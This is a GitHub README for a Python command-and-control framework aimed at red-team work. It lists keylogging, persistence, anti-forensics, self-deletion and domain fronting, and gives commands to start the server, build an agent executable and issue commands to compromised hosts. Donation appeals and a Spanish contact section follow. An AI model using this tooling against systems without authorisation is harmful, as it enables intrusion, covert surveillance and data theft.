# 🔌 ComandoYControlPython - C2 Framework

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![Security](https://img.shields.io/badge/Security-Red_Team-red.svg)](https://www.offensive-security.com/)

> Educational Command and Control (C2) framework written in Python for red team operations and security research.

## ✨ Features

- 🔌 **Remote Control**: Execute commands on compromised systems
- 📡 **Multi-Protocol**: HTTP, HTTPS, DNS, WebSocket
- 💾 **File Transfer**: Upload/download capabilities
- 📸 **Screen Capture**: Remote screenshot functionality
- 🎯 **Keylogging**: Keystroke monitoring
- 🔒 **Encrypted Comms**: AES-256 encryption
- 📊 **Dashboard**: Web-based C2 interface

## 💰 Support This Project

<div align="center">

### ₿ Bitcoin Donations Welcome!

<img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white" alt="Bitcoin"/>

```
┌─────────────────────────────────────┐
│    ₿  BTC Donation Address  ₿      │
├─────────────────────────────────────┤
│                                     │
│  bc1qqphwht25vjzlptwzjyjt3sex     │
│  7e3p8twn390fkw                    │
│                                     │
│  Network: Bitcoin (BTC)             │
│  Scan QR ↓                          │
└─────────────────────────────────────┘
```

<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=bitcoin:bc1qqphwht25vjzlptwzjyjt3sex7e3p8twn390fkw" alt="Bitcoin QR Code" width="200"/>

**Address:** `bc1qqphwht25vjzlptwzjyjt3sex7e3p8twn390fkw`

*Support red team tool development!* 🙏

</div>

---

## 🚀 Installation

```bash
git clone https://github.com/murdok1982/ComandoYControlPython.git
cd ComandoYControlPython
pip install -r requirements.txt

# Start C2 server
python c2_server.py

# Generate agent
python generate_agent.py --output agent.exe
```

## ⚙️ Configuration

```python
# config.py
C2_SERVER = "192.168.1.100"
C2_PORT = 443
COMMUNICATION_PROTOCOL = "https"
ENCRYPTION_KEY = "your_aes_key"
BEACON_INTERVAL = 60  # seconds
```

## 💻 Usage

### Server Side

```bash
# Start C2 server
python c2_server.py --port 443

# Access dashboard
http://localhost:8080/dashboard
```

### Agent Commands

```bash
# Execute command
> exec whoami

# Upload file
> upload /local/file.txt /remote/file.txt

# Download file
> download /remote/file.txt /local/file.txt

# Screenshot
> screenshot

# Start keylogger
> keylog start
```

## 🛠️ Modules

### 1. Command Execution
- Shell commands
- PowerShell scripts
- Python code execution

### 2. File Operations
- Upload/Download
- File listing
- File manipulation

### 3. Information Gathering
- System info
- Network info
- Process listing
- Screenshot capture

### 4. Persistence
- Registry modification
- Scheduled tasks
- Startup programs

## 🔒 Security Features

- AES-256 encryption
- SSL/TLS support
- Domain fronting
- Jitter in beaconing
- Anti-forensics
- Self-deletion

## ⚠️ Legal Warning

**EDUCATIONAL & AUTHORIZED USE ONLY**

🚨 **CRITICAL WARNING:**

- This is a **red team training tool**
- Requires **written authorization**
- Unauthorized use is **ILLEGAL**
- May violate computer fraud laws
- Can result in criminal prosecution

**Legal Uses:**
- ✅ Authorized red team engagements
- ✅ Security research (isolated lab)
- ✅ Educational purposes
- ✅ CTF competitions

**Illegal Uses:**
- ❌ Unauthorized system access
- ❌ Malicious activities
- ❌ Real-world attacks
- ❌ Deployment without consent

## 👤 Author

**murdok1982**
- GitHub: [@murdok1982](https://github.com/murdok1982)
- LinkedIn: [Gustavo Lobato Clara](https://www.linkedin.com/in/gustavo-lobato-clara-2b446b102/)

## 📝 License

MIT License - **Authorized Use Only**

**By using this tool, you agree to:**
- Use only for authorized purposes
- Obtain written permission
- Follow all applicable laws
- Accept full legal responsibility

---

⭐ **Star this repo!**

**Red Team Responsibly! 🔌**
---

## 🎖️ CENTRO DE COMUNICACIONES Y REPORTES OFICIALES
**NIVEL DE ACCESO:** AUTORIZADO | **DESTINATARIO:** COMANDANCIA DE DESARROLLO (gustavolobatoclara@gmail.com)

A través del siguiente portal de comunicaciones, el personal autorizado puede emitir reportes de incidencias, fallas críticas en despliegue (compilación) o solicitudes de mejoras estratégicas. Seleccione la directiva correspondiente para visualizar los protocolos de envío:

<details>
<summary><b>🚨 REPORTAR QUEJA O INCIDENCIA DISCIPLINARIA / OPERATIVA</b></summary>
<br>
Para tramitar una queja sobre el funcionamiento, estructura o contenido del sistema, envíe un mensaje a <b>gustavolobatoclara@gmail.com</b> siguiendo este protocolo:
<ol>
  <li><b>Asunto:</b> [QUEJA] - Nombre del Sistema - Breve descripción.</li>
  <li><b>Cuerpo del mensaje:</b> Detallar claramente la incidencia, impacto operativo y, si es posible, la evidencia (capturas o logs).</li>
  <li><b>Prioridad:</b> Indicar si es de atención inmediata o diferida.</li>
</ol>
</details>

<details>
<summary><b>🛠️ REPORTE DE PROBLEMAS DE COMPILACIÓN O DESPLIEGUE</b></summary>
<br>
Si experimenta fallos durante la fase de compilación o instalación del sistema, reporte a <b>gustavolobatoclara@gmail.com</b> con la siguiente estructura técnica:
<ol>
  <li><b>Asunto:</b> [COMPILACIÓN] - Falla en entorno &lt;Entorno/OS&gt;.</li>
  <li><b>Especificaciones:</b> Sistema Operativo, versión de dependencias y herramientas de compilación utilizadas.</li>
  <li><b>Traza de Error (Logs):</b> Adjunte el log completo de errores proporcionado por la terminal (en formato texto o captura legible).</li>
  <li><b>Pasos de Reproducción:</b> Secuencia exacta de comandos ejecutados antes del fallo crítico.</li>
</ol>
</details>

<details>
<summary><b>💡 SUGERENCIAS O SOLICITUDES DE DESARROLLO</b></summary>
<br>
Para proponer nuevas capacidades tácticas, módulos de inteligencia o mejoras de arquitectura, envíe su solicitud a <b>gustavolobatoclara@gmail.com</b>:
<ol>
  <li><b>Asunto:</b> [PROPUESTA] - Mejora o Nuevo Módulo.</li>
  <li><b>Objetivo Táctico:</b> ¿Qué problema resuelve o qué ventaja proporciona esta nueva característica?</li>
  <li><b>Viabilidad:</b> (Opcional) Posible enfoque técnico o herramientas recomendadas para su implementación.</li>
</ol>
</details>

---

---

## Support / Apoya este proyecto

I build open-source projects focused on applied AI, automation, and data intelligence.
Over on my GitHub you'll find things like AI-powered analysis engines, OSINT platforms for open-source research, Windows automation tools, and experiments with language models.
Everything is public and free, so anyone can use it, study it, or build on top of it. github.com/murdok1982

Keeping these projects alive takes a lot of hours. If any of them have helped you out or you just like what I'm doing, you can support me with a coffee: ko-fi.com/murdok1982

Every contribution goes straight back into shipping more open-source code.
